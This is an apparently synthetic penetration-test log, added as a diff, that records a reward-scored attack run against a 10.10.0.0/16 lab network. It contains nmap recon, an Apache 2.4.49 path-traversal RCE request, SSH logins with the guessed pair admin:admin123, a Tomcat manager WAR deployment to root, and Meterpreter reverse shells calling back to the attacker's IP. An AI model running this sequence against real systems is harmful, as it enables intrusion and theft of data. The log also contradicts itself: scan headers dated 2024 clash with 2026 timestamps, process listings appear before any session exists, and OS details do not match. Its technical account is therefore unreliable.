@@ -1,0 +1,456 @@
+================================================================================
+PENETRATION TEST ENGAGEMENT LOG
+Engagement: engagement_03_partial_recon_heavy
+Description: Expert does thorough recon before exploitation
+Start Time: 2026-01-15 11:53:00 UTC
+Attacker IP: 192.168.1.105
+Target Network: 10.10.0.0/16
+================================================================================
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 1] 2026-01-15 11:55:35 | Action: SubnetScan | Target: dmz-web01 (10.10.1.10)
+[RL] reward=0.0 | cumulative=0.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 11:55:35 2024 as: nmap -sn 10.10.1.0/24
+# Timestamp: 2026-01-15 11:55:35
+Nmap scan report for dmz-web01 (10.10.1.10)
+Host is up (0.0070s latency).
+MAC Address: 51:F3:E6:84:7E:8D (VMware)
+
+Nmap done: 256 IP addresses (1 hosts up) scanned in 6.59 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 2] 2026-01-15 11:58:03 | Action: OSScan | Target: dmz-web01 (10.10.1.10)
+[RL] reward=0.0 | cumulative=0.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 11:58:03 2024 as: nmap -O 10.10.1.10
+# Timestamp: 2026-01-15 11:58:03
+Nmap scan report for dmz-web01 (10.10.1.10)
+Host is up (0.0078s latency).
+Not shown: 993 closed ports
+22/tcp  open  ssh
+80/tcp  open  http
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:5.4
+OS details: Ubuntu 20.04.3 LTS, kernel 5.4.0-91-generic
+Network Distance: 2 hops
+
+OS detection performed. Report: https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 15.48 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 3] 2026-01-15 11:59:31 | Action: ServiceScan | Target: dmz-web01 (10.10.1.10)
+[RL] reward=0.0 | cumulative=0.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 11:59:31 2024 as: nmap -sV -sC 10.10.1.10
+# Timestamp: 2026-01-15 11:59:31
+Nmap scan report for dmz-web01 (10.10.1.10)
+Host is up (0.0036s latency).
+Not shown: 995 closed ports
+PORT      STATE SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
+80/tcp    open   http          Apache httpd 2.4.49 ((Ubuntu))
+| ssh-hostkey:
+|   3072 a3:29:46:4d:76:c4:4e:6d:20:d4:d0:a9:ee:d4:1f:69 (RSA)
+|   256 d7:c7:0a:c2:f4:03:b4:98:c7:d6:70:f9:70:8b:df:f8 (ECDSA)
+|_http-server-header: Apache httpd 2.4.49
+|_http-title: Welcome
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 4] 2026-01-15 12:01:29 | Action: ProcessScan | Target: dmz-web01 (10.10.1.10)
+[RL] reward=0.0 | cumulative=0.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Process scan on dmz-web01 (10.10.1.10) at 2026-01-15 12:01:29
+# Executed via: meterpreter > ps
+
+PID     PPID    USER            COMMAND
+------------------------------------------------------------
+1       0       root            /sbin/init
+292     1       root            /usr/sbin/sshd -D
+421     1       root            /usr/sbin/cron -f
+659     1       syslog          /usr/sbin/rsyslogd -n
+816     1       www-data        /usr/sbin/apache2 -k start
+940     816     www-data        /usr/sbin/apache2 -k start
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 5] 2026-01-15 12:04:00 | Action: HTTP-EXP | Target: dmz-web01 (10.10.1.10)
+[RL] reward=8.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/multi/http/apache_path_traversal_rce
+msf6 apache_path_traversal_rce(exploit/multi/http/apache_path_traversal_rce) > set RHOSTS 10.10.1.10
+RHOSTS => 10.10.1.10
+msf6 apache_path_traversal_rce(exploit/multi/http/apache_path_traversal_rce) > run
+
+[*] [2026-01-15 12:04:00] Started reverse TCP handler on 192.168.1.105:4446
+[*] [2026-01-15 12:04:00] 10.10.1.10:80 - Sending path traversal request...
+[*] [2026-01-15 12:04:00] 10.10.1.10:80 - GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
+[+] [2026-01-15 12:04:00] 10.10.1.10:80 - Path traversal successful, RCE achieved
+[*] [2026-01-15 12:04:00] Sending stage (807069 bytes) to 10.10.1.10
+[*] [2026-01-15 12:04:00] Meterpreter session 13 opened (192.168.1.105:4446 -> 10.10.1.10:59395)
+
+meterpreter > getuid
+Server username: www-data
+meterpreter > sysinfo
+Computer     : dmz-web01
+OS           : Ubuntu 20.04.3 LTS
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 6] 2026-01-15 12:06:39 | Action: SubnetScan | Target: ws-admin01 (10.10.3.30)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 12:06:39 2024 as: nmap -sn 10.10.3.0/24
+# Timestamp: 2026-01-15 12:06:39
+Nmap scan report for ws-admin01 (10.10.3.30)
+Host is up (0.0101s latency).
+MAC Address: 2A:DB:45:EC:5D:19 (VMware)
+
+Nmap scan report for ws-dev02 (10.10.3.31)
+Host is up (0.0043s latency).
+MAC Address: A7:6C:E8:A7:AC:C2 (VMware)
+
+Nmap scan report for honeypot-trap01 (10.10.3.32)
+Host is up (0.0045s latency).
+MAC Address: D7:81:29:F0:09:1A (VMware)
+
+Nmap scan report for ws-finance03 (10.10.3.33)
+Host is up (0.0150s latency).
+MAC Address: B3:72:23:14:0F:7E (VMware)
+
+Nmap scan report for ws-hr04 (10.10.3.34)
+Host is up (0.0034s latency).
+MAC Address: 0A:4E:7A:40:F2:3A (VMware)
+
+Nmap done: 256 IP addresses (5 hosts up) scanned in 5.38 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 7] 2026-01-15 12:07:49 | Action: OSScan | Target: ws-admin01 (10.10.3.30)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 12:07:49 2024 as: nmap -O 10.10.3.30
+# Timestamp: 2026-01-15 12:07:49
+Nmap scan report for ws-admin01 (10.10.3.30)
+Host is up (0.0075s latency).
+Not shown: 994 closed ports
+21/tcp  open  ftp
+3389/tcp  open  ms-wbt-server
+Device type: general purpose
+Running: Microsoft Windows 10
+OS CPE: cpe:/o:microsoft:windows_10
+OS details: Windows 10 Pro 21H2 (build 10.0.19044)
+Network Distance: 2 hops
+
+OS detection performed. Report: https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 10.85 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 8] 2026-01-15 12:10:39 | Action: ServiceScan | Target: ws-admin01 (10.10.3.30)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 12:10:39 2024 as: nmap -sV -sC 10.10.3.30
+# Timestamp: 2026-01-15 12:10:39
+Nmap scan report for ws-admin01 (10.10.3.30)
+Host is up (0.0116s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE       VERSION
+21/tcp    open   ftp           Microsoft ftpd
+3389/tcp  open   ms-wbt-server Microsoft Terminal Services
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 38.33 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 9] 2026-01-15 12:11:35 | Action: OSScan | Target: ws-dev02 (10.10.3.31)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 12:11:35 2024 as: nmap -O 10.10.3.31
+# Timestamp: 2026-01-15 12:11:35
+Nmap scan report for ws-dev02 (10.10.3.31)
+Host is up (0.0145s latency).
+Not shown: 991 closed ports
+22/tcp  open  ssh
+8080/tcp  open  http-proxy
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Ubuntu 18.04.6 LTS, kernel 4.15.0-163-generic
+Network Distance: 3 hops
+
+OS detection performed. Report: https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 10] 2026-01-15 12:13:09 | Action: ServiceScan | Target: ws-dev02 (10.10.3.31)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 12:13:09 2024 as: nmap -sV -sC 10.10.3.31
+# Timestamp: 2026-01-15 12:13:09
+Nmap scan report for ws-dev02 (10.10.3.31)
+Host is up (0.0073s latency).
+Not shown: 996 closed ports
+PORT      STATE SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
+8080/tcp  open   http-proxy    Apache Tomcat 9.0.30
+| ssh-hostkey:
+|   3072 cb:65:26:7c:34:9a:3d:15:b1:db:bd:23:ae:06:d7:fa (RSA)
+|   256 36:dd:b9:eb:4e:de:5a:8a:f7:ee:df:89:a5:7d:2c:8e (ECDSA)
+|_http-server-header: Apache Tomcat 9.0.30
+|_http-title: Apache2 Default Page
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 22.32 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 11] 2026-01-15 12:15:22 | Action: OSScan | Target: ws-finance03 (10.10.3.33)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 12:15:22 2024 as: nmap -O 10.10.3.33
+# Timestamp: 2026-01-15 12:15:22
+Nmap scan report for ws-finance03 (10.10.3.33)
+Host is up (0.0090s latency).
+Not shown: 996 closed ports
+21/tcp  open  ftp
+445/tcp  open  microsoft-ds
+Device type: general purpose
+Running: Microsoft Windows 10
+OS CPE: cpe:/o:microsoft:windows_10
+OS details: Windows 10 Enterprise 21H2 (build 10.0.19044)
+Network Distance: 2 hops
+
+OS detection performed. Report: https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 12] 2026-01-15 12:17:00 | Action: ServiceScan | Target: ws-finance03 (10.10.3.33)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 12:17:00 2024 as: nmap -sV -sC 10.10.3.33
+# Timestamp: 2026-01-15 12:17:00
+Nmap scan report for ws-finance03 (10.10.3.33)
+Host is up (0.0030s latency).
+Not shown: 993 closed ports
+PORT      STATE SERVICE       VERSION
+21/tcp    open   ftp           Microsoft ftpd
+445/tcp   open   microsoft-ds  Windows 10 Pro 21H2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 25.64 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 13] 2026-01-15 12:18:21 | Action: OSScan | Target: ws-hr04 (10.10.3.34)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 12:18:21 2024 as: nmap -O 10.10.3.34
+# Timestamp: 2026-01-15 12:18:21
+Nmap scan report for ws-hr04 (10.10.3.34)
+Host is up (0.0058s latency).
+Not shown: 994 closed ports
+80/tcp  open  http
+445/tcp  open  microsoft-ds
+Device type: general purpose
+Running: Microsoft Windows 10
+OS CPE: cpe:/o:microsoft:windows_10
+OS details: Windows Server 2019 (build 10.0.17763)
+Network Distance: 3 hops
+
+OS detection performed. Report: https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 8.17 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 14] 2026-01-15 12:19:24 | Action: ServiceScan | Target: ws-hr04 (10.10.3.34)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 12:19:24 2024 as: nmap -sV -sC 10.10.3.34
+# Timestamp: 2026-01-15 12:19:24
+Nmap scan report for ws-hr04 (10.10.3.34)
+Host is up (0.0019s latency).
+Not shown: 996 closed ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open   http          Microsoft IIS httpd 10.0
+445/tcp   open   microsoft-ds  Windows Server 2019
+|_http-server-header: Microsoft IIS httpd 10.0
+|_http-title: Apache2 Default Page
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 31.66 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 15] 2026-01-15 12:20:40 | Action: ProcessScan | Target: ws-dev02 (10.10.3.31)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Process scan on ws-dev02 (10.10.3.31) at 2026-01-15 12:20:40
+# Executed via: meterpreter > ps
+
+PID     PPID    USER            COMMAND
+------------------------------------------------------------
+1       0       root            /sbin/init
+288     1       root            /usr/sbin/sshd -D
+460     1       root            /usr/sbin/cron -f
+682     1       syslog          /usr/sbin/rsyslogd -n
+891     1       www-data        /usr/sbin/apache2 -k start
+932     891     www-data        /usr/sbin/apache2 -k start
+1257    1       tomcat          java -Dcatalina.base=/opt/tomcat
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 16] 2026-01-15 12:20:59 | Action: SSH-EXP | Target: ws-dev02 (10.10.3.31)
+[RL] reward=7.0 | cumulative=15.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/linux/ssh/openssh_authbypass
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > set RHOSTS 10.10.3.31
+RHOSTS => 10.10.3.31
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > run
+
+[*] [2026-01-15 12:20:59] Started reverse TCP handler on 192.168.1.105:4444
+[*] [2026-01-15 12:20:59] 10.10.3.31:22 - Attempting SSH authentication bypass...
+[*] [2026-01-15 12:20:59] 10.10.3.31:22 - Trying credential pair: admin:admin123
+[+] [2026-01-15 12:20:59] 10.10.3.31:22 - SSH session established
+[*] [2026-01-15 12:20:59] Sending stage (824393 bytes) to 10.10.3.31
+[*] [2026-01-15 12:20:59] Meterpreter session 10 opened (192.168.1.105:4444 -> 10.10.3.31:47261)
+
+meterpreter > getuid
+Server username: admin
+meterpreter > sysinfo
+Computer     : ws-dev02
+OS           : Ubuntu 18.04.6 LTS (kernel 4.15.0-163-generic)
+Architecture : x64
+Meterpreter  : x64/linux
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 17] 2026-01-15 12:22:57 | Action: Tomcat-PE | Target: ws-dev02 (10.10.3.31)
+[RL] reward=19.0 | cumulative=34.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/linux/local/tomcat_manager_deploy
+msf6 tomcat_manager_deploy(exploit/linux/local/tomcat_manager_deploy) > set RHOSTS 10.10.3.31
+RHOSTS => 10.10.3.31
+msf6 tomcat_manager_deploy(exploit/linux/local/tomcat_manager_deploy) > run
+
+[*] [2026-01-15 12:22:57] Running post-exploitation module on session...
+[*] [2026-01-15 12:22:57] 10.10.3.31 - Checking Tomcat manager access...
+[*] [2026-01-15 12:22:57] 10.10.3.31 - Found Tomcat 9.0.30 with default manager credentials
+[+] [2026-01-15 12:22:57] 10.10.3.31 - Deploying WAR payload via Tomcat manager...
+[+] [2026-01-15 12:22:57] 10.10.3.31 - Privilege escalation successful: www-data -> root
+
+meterpreter > getuid
+Server username: root
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 18] 2026-01-15 12:24:14 | Action: ServiceScan | Target: db-primary (10.10.2.20)
+[RL] reward=0.0 | cumulative=34.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 12:24:14 2024 as: nmap -sV -sC 10.10.2.20
+# Timestamp: 2026-01-15 12:24:14
+Nmap scan report for db-primary (10.10.2.20)
+Host is up (0.0044s latency).
+Not shown: 995 closed ports
+PORT      STATE SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 8.4p1 Debian 5+deb11u1
+3306/tcp  open   mysql         MySQL 5.7.36-0ubuntu0.18.04.1
+| ssh-hostkey:
+|   3072 f2:b0:d9:a9:b4:e8:8a:9c:80:76:3d:62:a1:3d:5e:62 (RSA)
+|   256 6e:f7:8d:90:33:63:97:74:b8:5b:9a:07:40:8c:17:1b (ECDSA)
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 19] 2026-01-15 12:25:01 | Action: SSH-EXP | Target: db-primary (10.10.2.20)
+[RL] reward=97.0 | cumulative=131.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/linux/ssh/openssh_authbypass
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > set RHOSTS 10.10.2.20
+RHOSTS => 10.10.2.20
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > run
+
+[*] [2026-01-15 12:25:01] Started reverse TCP handler on 192.168.1.105:4444
+[*] [2026-01-15 12:25:01] 10.10.2.20:22 - Attempting SSH authentication bypass...
+[*] [2026-01-15 12:25:01] 10.10.2.20:22 - Trying credential pair: admin:admin123
+[+] [2026-01-15 12:25:01] 10.10.2.20:22 - SSH session established
+[*] [2026-01-15 12:25:01] Sending stage (928680 bytes) to 10.10.2.20
+[*] [2026-01-15 12:25:01] Meterpreter session 4 opened (192.168.1.105:4444 -> 10.10.2.20:40401)
+
+meterpreter > getuid
+Server username: admin
+meterpreter > sysinfo
+Computer     : db-primary
+OS           : Debian 11 (kernel 5.10.0-20-amd64)
+Architecture : x64
+Meterpreter  : x64/linux
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 20] 2026-01-15 12:27:42 | Action: ServiceScan | Target: srv-backup01 (10.10.4.40)
+[RL] reward=0.0 | cumulative=131.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Sun Sep 15 12:27:42 2024 as: nmap -sV -sC 10.10.4.40
+# Timestamp: 2026-01-15 12:27:42
+Nmap scan report for srv-backup01 (10.10.4.40)
+Host is up (0.0041s latency).
+Not shown: 997 closed ports
+PORT      STATE SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 7.4 CentOS
+443/tcp   open   https         nginx 1.20.1
+| ssh-hostkey:
+|   3072 e1:ae:5e:1a:81:f4:3a:21:cd:fb:25:1b:4d:4c:9b:2b (RSA)
+|   256 7f:3c:d5:73:c2:e6:e2:98:db:9c:1e:32:6a:6c:87:29 (ECDSA)
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 19.71 seconds
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 21] 2026-01-15 12:28:41 | Action: SSH-EXP | Target: srv-backup01 (10.10.4.40)
+[RL] reward=97.0 | cumulative=228.0 | done=True | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/linux/ssh/openssh_authbypass
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > set RHOSTS 10.10.4.40
+RHOSTS => 10.10.4.40
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > run
+
+[*] [2026-01-15 12:28:41] Started reverse TCP handler on 192.168.1.105:4444
+[*] [2026-01-15 12:28:41] 10.10.4.40:22 - Attempting SSH authentication bypass...
+[*] [2026-01-15 12:28:41] 10.10.4.40:22 - Trying credential pair: admin:admin123
+[+] [2026-01-15 12:28:41] 10.10.4.40:22 - SSH session established
+[*] [2026-01-15 12:28:41] Sending stage (944701 bytes) to 10.10.4.40
+[*] [2026-01-15 12:28:41] Meterpreter session 3 opened (192.168.1.105:4444 -> 10.10.4.40:45129)
+
+meterpreter > getuid
+Server username: admin
+meterpreter > sysinfo
+Computer     : srv-backup01
+OS           : CentOS 7.9 (kernel 3.10.0-1160.el7)
+Architecture : x64
+Meterpreter  : x64/linux
+
+
+================================================================================
+ENGAGEMENT COMPLETE: 2026-01-15 12:28:41 UTC
+Total Steps: 21
+================================================================================
+Total Reward: 228
+Goal Reached: True
